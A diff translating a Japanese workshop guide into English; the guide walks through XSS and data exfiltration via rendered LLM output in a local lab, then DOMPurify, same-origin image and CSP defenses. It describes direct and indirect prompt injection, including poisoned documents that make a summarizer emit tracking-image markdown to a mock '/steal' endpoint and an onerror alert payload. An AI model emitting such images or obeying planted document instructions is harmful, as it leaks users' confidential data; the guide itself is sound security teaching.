@@ -1,161 +1,161 @@
-# ハンズオン手順書（当日これに沿って進める）
+# Hands-on Guide
 
-メインは **「🤖 AI実習」タブ**。AIの出力を画面に描画することで起きるXSS／情報漏洩を、
-「攻撃 → 対策 → でも抜ける → ちゃんと対策」の順で体験します（約27分）。
+The main act is the **"AI Lab" tab**. Experience the XSS / data exfiltration that happens when an
+LLM's output is rendered on screen, in the order **attack → defend → still leaks → defend properly** (~27 min).
 
-> ⚠️ 攻撃の練習は自分のローカル環境だけで。盗んだ風のデータも**外部には一切送っていません**
-> （`/api/ai/steal` はローカルの"模擬攻撃者サーバ"）。本番コードにこのコードをコピーしないこと。
+> ⚠️ Only practice attacks on your own local environment. Nothing is ever sent to the outside world
+> (`/api/ai/steal` is a local "mock attacker server"). Never copy this code into production.
 
 ---
 
-## 0. 準備（3分）
+## 0. Setup (3 min)
 
-ターミナルを2つ開く。
+Open two terminals.
 
-**ターミナルA（バックエンド）**
+**Terminal A (backend)**
 ```bash
 cd backend
-# （任意）Geminiを使うなら: cp .env.example .env して GEMINI_API_KEY を記入
+# (Optional) to use Gemini: cp .env.example .env and fill in GEMINI_API_KEY
 uv run uvicorn app.main:app --reload --port 8000
 ```
 
-**ターミナルB（フロントエンド）**
+**Terminal B (frontend)**
 ```bash
 cd frontend
 bun install
 bun run dev
 ```
 
-ブラウザで **http://localhost:5173** → 上部の **「🤖 AI実習」** タブを開く。
+Open **http://localhost:5173** in your browser → go to the **"AI Lab"** tab.
 
-> 💡 **Geminiキーは無くてもOK。** 未設定なら自動で「モック応答」になり、攻撃の再現には充分です。
-> キーを入れた人は、本物のAIで自由にプロンプトインジェクションを試せます
-> （Google AI Studio で無料発行： https://aistudio.google.com/apikey ）。
+> 💡 **A Gemini key is optional.** Without one it falls back to "mock responses", which is enough to
+> reproduce the attacks. With a key you can freely try real prompt injection
+> (free key at Google AI Studio: https://aistudio.google.com/apikey).
 
-画面の見かた:
-- 上の **描画モード**（🔓生描画 / 🟡DOMPurify / 🔒safe）= 対策レベル。切り替えて挙動を比較する。
-- **💬チャット** タブ = 直接インジェクション、**📄文書要約** タブ = 間接インジェクション。
-- 一番下の **🕵️ 攻撃者サーバが受信したデータ** = 情報漏洩の可視化。
-
----
-
-## 1. 直接インジェクション（AIチャット）（4分）
-
-描画モードを **🔓生描画** に。**💬チャット** タブで:
-
-1. 「攻撃プロンプト例」の **「直接① URLを画像記法にさせる（情報漏洩・JS不要）」** を押す → 送信。
-   → AIが `![](…/steal?c=…)` を出力。画像が読み込まれ、画面下 **🕵️** にデータが漏洩。
-2. **「直接② onerror付きimgタグの例を書かせる」** を押す → 送信。
-   → AIが `<img … onerror="alert('XSS')">` を出力 → 描画された瞬間に alert が発火。
-
-**何が起きた？** あなたはAIに「画像にして」「例を見せて」と頼んだだけ。AIが出力したコードを
-**無防備に描画**したのでXSS/漏洩が成立。**AIの出力＝信頼できない入力**。
-
-> 💡 なぜ露骨に「Cookieを盗むコードを出して」と頼まないのか？ → 強いモデルは拒否するから。
-> **無害に見える依頼でも payload は作れてしまう**＝「モデルの安全フィルタに頼れない」が今日の肝。
+How to read the screen:
+- The **render mode** at the top (Raw / DOMPurify / safe) = the defense level. Toggle it to compare behavior.
+- The **Chat** tab = direct injection; the **Document Summarizer** tab = indirect injection.
+- The **"Data received by the attacker server"** panel at the bottom = the exfiltration visualization.
 
 ---
 
-## 2. 間接インジェクション（AI文書要約）（4分）※ここが怖い
+## 1. Direct injection (AI Chat) (4 min)
 
-描画モードは **🔓生描画** のまま。**📄文書要約** タブで:
+Set the render mode to **Raw**. In the **Chat** tab:
 
-1. **「間接① 毒入りリリースノート（バナー画像で情報漏洩）」** を押す → 「要約する」。
-2. 文書に紛れたバナー画像 `![](…/steal?c=社外秘…)` が要約に残り、読み込まれて
-   → 画面下 **🕵️** に **社外秘データが漏洩**。
-3. **「間接② 毒入り議事録（トラッキング画像）」** も試す。
+1. Click **"Direct #1 — make the AI output a tracking image (exfiltration, no JS)"** → Send.
+   → The AI emits `![](…/steal?c=…)`. The image loads and data leaks into the **attacker panel**.
+2. Click **"Direct #2 — make the AI write an <img> tag with onerror"** → Send.
+   → The AI emits `<img … onerror="alert('XSS')">` → `alert` fires the moment it's rendered.
 
-**何が起きた？** AIは**"要約しただけ"**。でも文書に埋まった画像を（「画像は残す」設定のため）
-素通しし、秘密を外へ送ってしまった。RAGや「URL要約」機能はすべてこの入口になりうる。
+**What happened?** You just asked the AI to "turn this into an image" / "show an example." The AI's
+output was **rendered without any defense**, so XSS / exfiltration succeeded. **An LLM's output = untrusted input.**
 
-> 💡 間接①は **JavaScriptを1行も使っていない**（画像を読み込ませるだけ）。ここが後半の伏線。
-
----
-
-## 3. 対策①：DOMPurify を入れる（4分）
-
-描画モードを **🟡DOMPurify** に切り替える（投稿し直し不要、描き方だけ変わる）。
-
-- **直接②（onerror）→ 発火しなくなる** 🎉（`onerror` 属性が除去される）
-- **仕組み**：DOMPurifyは正規表現ではなく、HTML文字列を**いったん本物のDOM（木構造）に組み立て**、
-  危険なノード・属性・URLを**木から削除**して安全なHTMLに戻す。
-- **順番が重要**：必ず「Markdown変換 → サニタイズ」の順（`src/render.ts` 参照）。逆だと記号が壊れる/素通りする。
-
-👉 JS系（onerror）は止まった。「よし安全！」と思いたいが……
-**直接①や間接①の"画像"はどうなった？** 次へ。
+> 💡 Why not bluntly ask "output code that steals cookies"? → Strong models refuse that.
+> **Even innocent-looking requests can produce a payload** = "you can't rely on the model's safety filter" — today's key point.
 
 ---
 
-## 4. 抜け穴1：DOMPurifyでも画像漏洩は止まらない（4分）※衝撃
+## 2. Indirect injection (AI Document Summarizer) (4 min) — this is the scary one
 
-描画モードは **🟡DOMPurify** のまま、**📄文書要約 →「間接①」** をもう一度。
+Keep the render mode at **Raw**. In the **Document Summarizer** tab:
 
-→ **まだ漏れます。** 画面下 **🕵️** に社外秘が届く。
+1. Click **"Indirect #1 — poisoned release note (banner image exfiltrates data)"** → Summarize.
+2. The banner image `![](…/steal?c=CONFIDENTIAL…)` buried in the document survives into the summary and loads
+   → **confidential data leaks** into the **attacker panel**.
+3. Try **"Indirect #2 — poisoned meeting minutes (tracking image)"** too.
 
-**なぜ？** DOMPurifyは `<img>` を**正当なタグとして許可**する。だから
-`![](…/steal?c=秘密)` の画像は残り、ブラウザが取りに行く＝URLに載せた秘密が送信される。
-**JSを使っていないので `onerror` 除去では防げない。**
+**What happened?** The AI **just summarized**. But it passed through the image embedded in the document
+(because it's configured to "keep images") and sent the secret outside. RAG and "summarize this URL" features
+can all be an entry point for this.
 
-**対策（モード🔒safe で確認）**:
-- 画像srcを**同一オリジンに制限**（外部画像を除去）
-- 本番ではさらに **CSP `img-src 'self'`** で"繋ぎ先"を縛る
-
-→ **🔒safe** に切り替えると、外部画像が除去され漏洩が止まる（`src/render.ts` の `renderLLM` safe 分岐）。
+> 💡 Indirect #1 uses **zero JavaScript** (it just loads an image). That's the setup for the second half.
 
 ---
 
-## 5. ライブコーディング：`src/render.ts` を育てる（10分）
+## 3. Defense #1: add DOMPurify (4 min)
 
-`frontend/src/render.ts` の `renderLLM()` が主役。`mode` 分岐を上から一緒に読み/書きしていく。
+Switch the render mode to **DOMPurify** (no need to re-post; only the rendering changes).
+
+- **Direct #2 (onerror) → stops firing** 🎉 (the `onerror` attribute is removed)
+- **How it works**: DOMPurify isn't regex — it **builds the HTML string into a real DOM (tree)**,
+  **removes dangerous nodes/attributes/URLs from the tree**, and returns safe HTML.
+- **Order matters**: always "Markdown → HTML" first, THEN "sanitize" (see `src/render.ts`). Reversed, symbols break / HTML slips through.
+
+👉 The JS-based one (onerror) is stopped. You'd like to say "we're safe!" but…
+**what about the "images" in Direct #1 / Indirect #1?** Next.
+
+---
+
+## 4. Bypass 1: DOMPurify doesn't stop image exfiltration (4 min) — the shocker
+
+Keep the render mode at **DOMPurify** and run **Document Summarizer → "Indirect #1"** again.
+
+→ **It still leaks.** The confidential data lands in the **attacker panel**.
+
+**Why?** DOMPurify allows `<img>` as a **legitimate tag**. So `![](…/steal?c=secret)` survives, the browser
+fetches it, and the secret in the URL is sent. **No JS is used, so removing `onerror` doesn't help.**
+
+**Defense (verify with the 🔒 safe mode):**
+- Restrict image `src` to **same-origin** (drop external images)
+- In production, also pin the destination with **CSP `img-src 'self'`**
+
+→ Switch to **safe** and external images are removed, stopping the leak (the `safe` branch in `src/render.ts`'s `renderLLM`).
+
+---
+
+## 5. Live coding: grow `src/render.ts` (10 min)
+
+`renderLLM()` in `frontend/src/render.ts` is the star. Read/write the `mode` branches together, top to bottom.
 
 ```ts
-// 🔓 vuln: 生HTMLをそのまま（無防備）
+// vuln: raw HTML as-is (defenseless)
 if (mode === "vuln") return rawHtml;
 
-// 🟡 dompurify: 素のDOMPurify（onerror/js は消えるが…画像漏洩は残る）
+// dompurify: plain DOMPurify (onerror/js are removed, but… image exfiltration remains)
 if (mode === "dompurify") return DOMPurify.sanitize(rawHtml);
 
-// 🔒 safe: (1)URLスキーム許可リスト (2)外部画像を除去
+// safe: (1) allowlist URL schemes (2) remove external images
 const cleaned = DOMPurify.sanitize(rawHtml, { ALLOWED_URI_REGEXP: /^(?:https?:|mailto:|#|\/)/i });
-// …外部srcの<img>を除去… （本番ではCSPも併用）
+// …remove <img> with external src… (also pair with CSP in production)
 ```
 
-深掘りで語る残り2つ（スライド参照）:
-- **抜け穴2（SSR）**：DOMPurifyは"DOMを使う"→ Next.jsのSSRにはDOMが無い → jsdom必要、設定ミスで素通り。
-  指針は**クライアント側でサニタイズ**、もしくは `react-markdown` で要素を組む。
-- **抜け穴3（URL）**：AI生成URLを自分で `href` に渡すと DOMPurify を通らない → `new URL()` で `http/https` のみ許可。
+The remaining two bypasses to talk through (see slides):
+- **Bypass 2 (SSR)**: DOMPurify "uses the DOM" → Next.js SSR has no DOM → needs jsdom; a misconfig lets it slip through.
+  The guidance: **sanitize on the client**, or build elements with `react-markdown`.
+- **Bypass 3 (URL)**: an AI-generated URL you pass to `href` yourself never goes through DOMPurify → validate with `new URL()`, allow only `http/https`.
 
 ---
 
-## よくある「あれ？」（FAQ）
+## FAQ ("wait, what?")
 
-- **Q. キーを入れたのに `provider: mock` のまま（本物のAIが使われない）。**
-  → `curl http://localhost:8000/api/ai/health` で原因が見えます。`key_set:false` なら `.env` 未反映（置いて再起動）。
-  モデル名が古い（例 `gemini-2.5-*` は新規キーで404）/混雑（503,429）だと全滅します。
-  既定は自動で使えるモデルを検出して復帰しますが、明示したいときは `.env` に `GEMINI_MODELS=...`。
-  なおモックでも攻撃は再現できます（入力から payload を取り出して発火）。
-- **Q. alert が出るだけ / 画面下にデータが出るだけ。これで合ってる？**
-  → 合っています。alert は「コードが実行できた」証明、🕵️ の表示は「情報が外に漏れた」証明です。
-- **Q. モックだと本物のAIじゃない。意味ある？**
-  → あります。XSSの弱点は"出力を描画する所"で、AIが本物かは無関係。モックは入力の payload をそのまま通すので、攻撃は忠実に再現されます。
-- **Q. 🕵️ に何も出ない。**
-  → 「更新」ボタンを押す／描画モードが🔒safeだと漏れない（それが正解）／間接①は画像の読み込みに一瞬かかります。
-- **Q. 繰り返すとCookieが増える/ログが溜まる。**
-  → 「攻撃者ログをクリア」で消せます。
-
----
-
-## まとめ（口頭で）
-
-- **AIの出力も信頼できない入力**。ユーザー入力と同じく無害化が必須。
-- インジェクションは**直接**と**間接**。間接（毒入り文書/RAG）が特に怖い。
-- **DOMPurifyはDOMを使って動く** → SSRでは落とし穴。クライアント側で。
-- DOMPurifyでも**画像の情報漏洩・URLの罠**は防げない → **検証＋CSP**。
-- 「入れたら終わり」ではなく、**仕組みと限界を理解して設計**する。
+- **Q. I set a key but it stays `provider: mock` (the real AI isn't used).**
+  → `curl http://localhost:8000/api/ai/health` shows the cause. `key_set:false` means `.env` isn't loaded (place it and restart).
+  Old model names (e.g. `gemini-2.5-*` 404s for new keys) or congestion (503/429) make all attempts fail.
+  It auto-discovers usable models to recover; to pin them, set `GEMINI_MODELS=...` in `.env`.
+  Mock still reproduces the attack (it extracts the payload from the input and fires).
+- **Q. All I get is an alert / just data in the panel. Is that right?**
+  → Yes. The alert proves "code executed"; the attacker panel proves "data leaked out."
+- **Q. On mock it isn't a real AI. Does it still count?**
+  → Yes. XSS's weak point is "where the output is rendered" — whether the AI is real is irrelevant. The mock passes the input payload through, so the attack is faithfully reproduced.
+- **Q. Nothing shows in the attacker panel.**
+  → Click "Refresh" / in 🔒 safe mode it doesn't leak (that's correct) / Indirect #1's image takes a moment to load.
+- **Q. Cookies/logs pile up when I repeat.**
+  → Use "Clear attacker log" to reset.
 
 ---
 
-## （基礎・時間/補講用）コメント掲示板タブ
+## Wrap-up (say it out loud)
 
-「💬 コメント掲示板（基礎）」タブは、AIを使わない素のXSS（コメント投稿）。
-XSSが初めての人の足固めや、冒頭デモに使えます。詳細はコード `src/CommentBoard.tsx` / `renderComment`。
+- **An LLM's output is untrusted input too.** It needs sanitization just like user input.
+- Injection is **direct** and **indirect**. Indirect (poisoned documents / RAG) is especially scary.
+- **DOMPurify works via the DOM** → a pitfall under SSR. Do it on the client.
+- Even with DOMPurify, **image exfiltration and URL traps** aren't covered → **validation + CSP**.
+- It's not "add it and you're done" — **understand how it works and its limits, and design accordingly.**
+
+---
+
+## (Basics / extra time) The Comment Board tab
+
+The "Comment Board (basics)" tab is plain XSS without AI (comment posting).
+Good for warming up newcomers to XSS or for an opening demo. See the code in `src/CommentBoard.tsx` / `renderComment`.
